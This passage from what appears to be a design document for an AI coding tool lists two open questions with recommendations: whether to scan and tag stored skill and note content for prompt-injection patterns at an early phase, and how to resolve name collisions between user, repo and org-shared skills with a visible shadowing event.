5. **Layer D bodies (Skills, RepoNotes, Conventions) are stored as prompt-injection substrate.** Should we *also* run a prompt-injection-pattern scan at Phase 2 and surface a count, or leave that to Phase 3 channel discipline? My recommendation: scan-and-tag at Phase 2 (analogous to the secret redactor's mechanism, but tag rather than redact — Phase 3 needs the content), so Phase 3 has the marker without re-scanning every gather.
6. **`SkillsIndex` collision resolution between `~/.codegenie/skills/` (user) and `~/.codegenie/skills-org/` (org-shared).** First-tier-wins (user > repo-local > org-shared) is the conservative default but means an org-shared upgrade silently does not apply if a user has the same name. Synthesizer may want to flip this to org-wins or to emit a `SkillShadowed` event. My recommendation: user > repo > org with a *loud* `SkillShadowed` event so the override is visible.
